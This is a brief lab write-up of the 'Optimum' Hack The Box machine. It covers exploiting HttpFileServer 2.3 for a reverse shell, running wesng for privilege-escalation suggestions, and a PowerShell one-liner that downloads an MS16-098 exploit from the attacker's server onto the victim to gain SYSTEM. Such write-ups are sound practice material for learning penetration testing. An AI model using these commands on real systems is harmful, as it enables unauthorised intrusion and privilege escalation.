# Optimum

> Nashia Holloway | May 27th, 2020

### 10.10.10.8

## Enumeration

Only port 80 is open. It's running HttpFileServer 2.3, which has an exploit available. I had to host nc.exe on a python web server (nc.exe from `/usr/share/windows-binaries/nc.exe`).

## Initial Access

```
python3 -m http.server 
```

I started a netcat listener and then had to change the local address and port in the exploit script to my tun0 address and port I se the netcat listener on.

```
python exploit.py 10.10.10.8 80
```

Kicked off a reverse shell running as the user Kostas, and I'm able to get the user flag.

## Privilege Escalation

A good windows exploit suggester is [wesng](https://github.com/bitsadmin/wesng). I cloned the repository in `/opt` and after copying the victim machine's systeminfo output locally, I run the script.

```
python3 /opt/wesng/wes.py --definitions /opt/wesng/definitions.zip -e sysinfo.txt
```

This gives back may too much info to be useful. I need to work on Windows post-exploitation enumeration in order to privesc. Ended up looking at a writeup, and people used MS16-098. So I hosted that on the python server and used PowerShell on the victim machine to pull it over.

```
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.46:8000/41020.exe', 'C:\Users\kostas\Desktop\privesc.exe')"
```

Running this I elevate to system and am able to get the root flag.
